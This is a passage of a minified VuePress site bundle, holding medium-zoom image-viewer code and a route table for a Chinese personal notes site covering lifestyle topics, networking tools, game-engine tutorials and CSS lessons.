e(){w=!1,A.zoomed.removeEventListener("transitionend",e),A.original.dispatchEvent(ui("medium-zoom:opened",{detail:{zoom:T}})),n(T)})),A.original.getAttribute("data-zoom-src")){A.zoomedHd=A.zoomed.cloneNode(),A.zoomedHd.removeAttribute("srcset"),A.zoomedHd.removeAttribute("sizes"),A.zoomedHd.src=A.zoomed.getAttribute("data-zoom-src"),A.zoomedHd.onerror=function(){clearInterval(r),console.warn("Unable to reach the zoom image target "+A.zoomedHd.src),A.zoomedHd=null,t()};var r=setInterval((function(){A.zoomedHd.complete&&(clearInterval(r),A.zoomedHd.classList.add("medium-zoom-image--opened"),A.zoomedHd.addEventListener("click",h),document.body.appendChild(A.zoomedHd),t())}),10)}else if(A.original.hasAttribute("srcset")){A.zoomedHd=A.zoomed.cloneNode(),A.zoomedHd.removeAttribute("sizes"),A.zoomedHd.removeAttribute("loading");var s=A.zoomedHd.addEventListener("load",(function(){A.zoomedHd.removeEventListener("load",s),A.zoomedHd.classList.add("medium-zoom-image--opened"),A.zoomedHd.addEventListener("click",h),document.body.appendChild(A.zoomedHd),t()}))}else t()}}}))},h=function(){return new o((function(n){if(!w&&A.original){w=!0,document.body.classList.remove("medium-zoom--opened"),A.zoomed.style.transform="",A.zoomedHd&&(A.zoomedHd.style.transform=""),A.template&&(A.template.style.transition="opacity 150ms",A.template.style.opacity=0),A.original.dispatchEvent(ui("medium-zoom:close",{detail:{zoom:T}})),A.zoomed.addEventListener("transitionend",(function e(){A.original.classList.remove("medium-zoom-image--hidden"),document.body.removeChild(A.zoomed),A.zoomedHd&&document.body.removeChild(A.zoomedHd),document.body.removeChild(j),A.zoomed.classList.remove("medium-zoom-image--opened"),A.template&&document.body.removeChild(A.template),w=!1,A.zoomed.removeEventListener("transitionend",e),A.original.dispatchEvent(ui("medium-zoom:closed",{detail:{zoom:T}})),A.original=null,A.zoomed=null,A.zoomedHd=null,A.template=null,n(T)}))}else n(T)}))},v=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},e=n.target;return A.original?h():m({target:e})},b=function(){return k},g=function(){return x},f=function(){return A.original},x=[],y=[],w=!1,E=0,k=t,A={original:null,zoomed:null,zoomedHd:null,template:null};"[object Object]"===Object.prototype.toString.call(e)?k=e:(e||"string"==typeof e)&&d(e),k=ri({margin:0,background:"#fff",scrollOffset:40,container:null,template:null},k);var j=ci(k.background);document.addEventListener("click",a),document.addEventListener("keyup",s),document.addEventListener("scroll",r),window.addEventListener("resize",h);var T={open:m,close:h,toggle:v,update:i,clone:l,attach:d,detach:c,on:p,off:u,getOptions:b,getImages:g,getZoomedImage:f};return T},hi=[Ys,ei,ai,{data:()=>({zoom:null}),mounted(){this.updateZoom()},updated(){this.updateZoom()},methods:{updateZoom(){setTimeout(()=>{this.zoom&&this.zoom.detach(),this.zoom=mi(".theme-default-content :not(a) > img",{})},1e3)}}}],vi={name:"GlobalLayout",computed:{layout(){const n=this.getLayout();return $s("layout",n),za.component(n)}},methods:{getLayout(){if(this.$page.path){const n=this.$page.frontmatter.layout;return n&&(this.$vuepress.getLayoutAsyncComponent(n)||this.$vuepress.getVueComponent(n))?n:"Layout"}return"NotFound"}}},bi=t(13),gi=Object(bi.a)(vi,(function(){var n=this.$createElement;return(this._self._c||n)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(n,e,t){switch(e){case"components":n[e]||(n[e]={}),Object.assign(n[e],t);break;case"mixins":n[e]||(n[e]=[]),n[e].push(...t);break;default:throw new Error("Unknown option name.")}}(gi,"mixins",hi);const fi=[{name:"v-4c947606",path:"/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4c947606").then(t)}},{path:"/index.html",redirect:"/"},{name:"v-239fd83a",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E5%9C%9F%E5%91%B3%E6%83%85%E8%AF%9D.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-239fd83a").then(t)}},{path:"/book-sketches/日常生活/土味情话.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E5%9C%9F%E5%91%B3%E6%83%85%E8%AF%9D.html"},{path:"/book-sketches/日常生活/土味情话.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E5%9C%9F%E5%91%B3%E6%83%85%E8%AF%9D.html"},{name:"v-8db45cd6",path:"/book-sketches/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-8db45cd6").then(t)}},{path:"/book-sketches/index.html",redirect:"/book-sketches/"},{name:"v-e34bd69a",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E7%A5%9B%E7%97%98%E5%8E%BB%E7%B2%89%E5%88%BA%E7%A5%9B%E5%8D%B0.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-e34bd69a").then(t)}},{path:"/book-sketches/日常生活/祛痘去粉刺祛印.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E7%A5%9B%E7%97%98%E5%8E%BB%E7%B2%89%E5%88%BA%E7%A5%9B%E5%8D%B0.html"},{path:"/book-sketches/日常生活/祛痘去粉刺祛印.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E7%A5%9B%E7%97%98%E5%8E%BB%E7%B2%89%E5%88%BA%E7%A5%9B%E5%8D%B0.html"},{name:"v-948c51ca",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/Frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-948c51ca").then(t)}},{path:"/book-sketches/电脑工具/Frp实现内网穿透.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/Frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html"},{path:"/book-sketches/电脑工具/Frp实现内网穿透.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/Frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html"},{name:"v-f9cc7df6",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E9%B9%A4%E5%8F%94%E5%8C%BB%E7%96%97%E7%A7%91%E6%99%AE%E5%90%88%E9%9B%86.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-f9cc7df6").then(t)}},{path:"/book-sketches/日常生活/鹤叔医疗科普合集.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E9%B9%A4%E5%8F%94%E5%8C%BB%E7%96%97%E7%A7%91%E6%99%AE%E5%90%88%E9%9B%86.html"},{path:"/book-sketches/日常生活/鹤叔医疗科普合集.html",redirect:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E9%B9%A4%E5%8F%94%E5%8C%BB%E7%96%97%E7%A7%91%E6%99%AE%E5%90%88%E9%9B%86.html"},{name:"v-42d362c4",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/SoftEther%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-42d362c4").then(t)}},{path:"/book-sketches/电脑工具/SoftEther实现虚拟局域网.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/SoftEther%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91.html"},{path:"/book-sketches/电脑工具/SoftEther实现虚拟局域网.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/SoftEther%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91.html"},{name:"v-198b10d1",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/win10%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-198b10d1").then(t)}},{path:"/book-sketches/电脑工具/win10下载与安装.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/win10%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html"},{path:"/book-sketches/电脑工具/win10下载与安装.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/win10%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85.html"},{name:"v-464604f5",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%BF%E7%94%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-464604f5").then(t)}},{path:"/book-sketches/电脑工具/谷歌浏览器使用.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%BF%E7%94%A8.html"},{path:"/book-sketches/电脑工具/谷歌浏览器使用.html",redirect:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%BF%E7%94%A8.html"},{name:"v-69bdf3c6",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-69bdf3c6").then(t)}},{path:"/book-web/CocosCreator游戏引擎/1.环境搭建.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{path:"/book-web/CocosCreator游戏引擎/1.环境搭建.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{name:"v-4afda086",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E7%86%9F%E6%82%89%E7%BC%96%E8%BE%91%E5%99%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-4afda086").then(t)}},{path:"/book-web/CocosCreator游戏引擎/2.熟悉编辑器.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E7%86%9F%E6%82%89%E7%BC%96%E8%BE%91%E5%99%A8.html"},{path:"/book-web/CocosCreator游戏引擎/2.熟悉编辑器.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E7%86%9F%E6%82%89%E7%BC%96%E8%BE%91%E5%99%A8.html"},{name:"v-14900d75",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E8%B5%84%E6%BA%90%E5%B7%A5%E4%BD%9C%E6%B5%81.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-14900d75").then(t)}},{path:"/book-web/CocosCreator游戏引擎/2.资源工作流.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E8%B5%84%E6%BA%90%E5%B7%A5%E4%BD%9C%E6%B5%81.html"},{path:"/book-web/CocosCreator游戏引擎/2.资源工作流.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.%E8%B5%84%E6%BA%90%E5%B7%A5%E4%BD%9C%E6%B5%81.html"},{name:"v-19e944ef",path:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-19e944ef").then(t)}},{path:"/book-web/CocosCreator游戏引擎/CocosCreator游戏开发.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.html"},{path:"/book-web/CocosCreator游戏引擎/CocosCreator游戏开发.html",redirect:"/book-web/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/CocosCreator%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91.html"},{name:"v-7c2733f6",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-7c2733f6").then(t)}},{path:"/book-web/LayaBox游戏引擎/1.环境搭建.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{path:"/book-web/LayaBox游戏引擎/1.环境搭建.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/1.%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"},{name:"v-0c36c16a",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.IDE%E7%9A%84%E4%BD%BF%E7%94%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-0c36c16a").then(t)}},{path:"/book-web/LayaBox游戏引擎/2.IDE的使用.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.IDE%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{path:"/book-web/LayaBox游戏引擎/2.IDE的使用.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/2.IDE%E7%9A%84%E4%BD%BF%E7%94%A8.html"},{name:"v-f9e20114",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/3.%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E4%BB%8B%E7%BB%8D.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-f9e20114").then(t)}},{path:"/book-web/LayaBox游戏引擎/3.组件库的介绍.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/3.%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E4%BB%8B%E7%BB%8D.html"},{path:"/book-web/LayaBox游戏引擎/3.组件库的介绍.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/3.%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E4%BB%8B%E7%BB%8D.html"},{name:"v-2d5291f4",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/4.%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-2d5291f4").then(t)}},{path:"/book-web/LayaBox游戏引擎/4.常用组件详解.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/4.%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3.html"},{path:"/book-web/LayaBox游戏引擎/4.常用组件详解.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/4.%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3.html"},{name:"v-74228cbc",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/5.%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-74228cbc").then(t)}},{path:"/book-web/LayaBox游戏引擎/5.组件化开发.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/5.%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91.html"},{path:"/book-web/LayaBox游戏引擎/5.组件化开发.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/5.%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91.html"},{name:"v-66c8ae85",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/6.%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E4%B8%8E%E6%8A%97%E9%94%AF%E9%BD%BF.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-66c8ae85").then(t)}},{path:"/book-web/LayaBox游戏引擎/6.屏幕适配与抗锯齿.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/6.%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E4%B8%8E%E6%8A%97%E9%94%AF%E9%BD%BF.html"},{path:"/book-web/LayaBox游戏引擎/6.屏幕适配与抗锯齿.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/6.%E5%B1%8F%E5%B9%95%E9%80%82%E9%85%8D%E4%B8%8E%E6%8A%97%E9%94%AF%E9%BD%BF.html"},{name:"v-8a9a8ecc",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/7.%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-8a9a8ecc").then(t)}},{path:"/book-web/LayaBox游戏引擎/7.性能优化.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/7.%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html"},{path:"/book-web/LayaBox游戏引擎/7.性能优化.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/7.%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html"},{name:"v-2beb3a85",path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-2beb3a85").then(t)}},{path:"/book-web/LayaBox游戏引擎/",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/"},{path:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/index.html",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/"},{path:"/book-web/LayaBox游戏引擎/",redirect:"/book-web/LayaBox%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E/"},{name:"v-36341369",path:"/book-web/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-36341369").then(t)}},{path:"/book-web/index.html",redirect:"/book-web/"},{name:"v-94436878",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/1.%E9%80%89%E6%8B%A9%E5%99%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-94436878").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/1.选择器.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/1.%E9%80%89%E6%8B%A9%E5%99%A8.html"},{path:"/book-web/html、css、js、ts/学习CSS/1.选择器.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/1.%E9%80%89%E6%8B%A9%E5%99%A8.html"},{name:"v-71c49bdf",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/10.%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-71c49bdf").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/10.媒体查询.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/10.%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html"},{path:"/book-web/html、css、js、ts/学习CSS/10.媒体查询.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/10.%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2.html"},{name:"v-63eaf561",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/11.%E8%BF%98%E5%8E%9FUI%E8%AE%BE%E8%AE%A1.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-63eaf561").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/11.还原UI设计.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/11.%E8%BF%98%E5%8E%9FUI%E8%AE%BE%E8%AE%A1.html"},{path:"/book-web/html、css、js、ts/学习CSS/11.还原UI设计.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/11.%E8%BF%98%E5%8E%9FUI%E8%AE%BE%E8%AE%A1.html"},{name:"v-5b977d77",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/2.%E7%9B%92%E6%A8%A1%E5%9E%8B.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-5b977d77").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/2.盒模型.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/2.%E7%9B%92%E6%A8%A1%E5%9E%8B.html"},{path:"/book-web/html、css、js、ts/学习CSS/2.盒模型.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/2.%E7%9B%92%E6%A8%A1%E5%9E%8B.html"},{name:"v-8a70ddc2",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/3.%E5%AD%97%E4%BD%93%E4%B8%8E%E6%96%87%E6%9C%AC%E5%B1%9E%E6%80%A7.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-8a70ddc2").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/3.字体与文本属性.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/3.%E5%AD%97%E4%BD%93%E4%B8%8E%E6%96%87%E6%9C%AC%E5%B1%9E%E6%80%A7.html"},{path:"/book-web/html、css、js、ts/学习CSS/3.字体与文本属性.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/3.%E5%AD%97%E4%BD%93%E4%B8%8E%E6%96%87%E6%9C%AC%E5%B1%9E%E6%80%A7.html"},{name:"v-11941828",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/4.%E5%8F%98%E6%8D%A2%E3%80%81%E8%BF%87%E6%B8%A1%E3%80%81%E5%8A%A8%E7%94%BB.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-11941828").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/4.变换、过渡、动画.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/4.%E5%8F%98%E6%8D%A2%E3%80%81%E8%BF%87%E6%B8%A1%E3%80%81%E5%8A%A8%E7%94%BB.html"},{path:"/book-web/html、css、js、ts/学习CSS/4.变换、过渡、动画.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/4.%E5%8F%98%E6%8D%A2%E3%80%81%E8%BF%87%E6%B8%A1%E3%80%81%E5%8A%A8%E7%94%BB.html"},{name:"v-115f2139",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/5.%E5%AE%9A%E4%BD%8D%E4%B8%8E%E6%B5%AE%E5%8A%A8.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-115f2139").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/5.定位与浮动.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/5.%E5%AE%9A%E4%BD%8D%E4%B8%8E%E6%B5%AE%E5%8A%A8.html"},{path:"/book-web/html、css、js、ts/学习CSS/5.定位与浮动.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/5.%E5%AE%9A%E4%BD%8D%E4%B8%8E%E6%B5%AE%E5%8A%A8.html"},{name:"v-493e907e",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/6.%E8%A1%A8%E6%A0%BC%E4%B8%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-493e907e").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/6.表格与居中布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/6.%E8%A1%A8%E6%A0%BC%E4%B8%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html"},{path:"/book-web/html、css、js、ts/学习CSS/6.表格与居中布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/6.%E8%A1%A8%E6%A0%BC%E4%B8%8E%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80.html"},{name:"v-0671b2bb",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/7.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-0671b2bb").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/7.多列布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/7.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html"},{path:"/book-web/html、css、js、ts/学习CSS/7.多列布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/7.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html"},{name:"v-75f6d2a5",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/8.%E5%BC%B9%E6%80%A7%E7%9B%92%E5%B8%83%E5%B1%80.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-75f6d2a5").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/8.弹性盒布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/8.%E5%BC%B9%E6%80%A7%E7%9B%92%E5%B8%83%E5%B1%80.html"},{path:"/book-web/html、css、js、ts/学习CSS/8.弹性盒布局.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/8.%E5%BC%B9%E6%80%A7%E7%9B%92%E5%B8%83%E5%B1%80.html"},{name:"v-2f71c012",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-2f71c012").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/"},{path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/index.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/"},{path:"/book-web/html、css、js、ts/学习CSS/",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/"},{name:"v-b5548f06",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/css%E6%95%A3%E8%AE%B0.html",component:gi,beforeEnter:(n,e,t)=>{Vs("Layout","v-b5548f06").then(t)}},{path:"/book-web/html、css、js、ts/学习CSS/css散记.html",redirect:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/css%E6%95%A3%E8%AE%B0.html"},{path:"/book-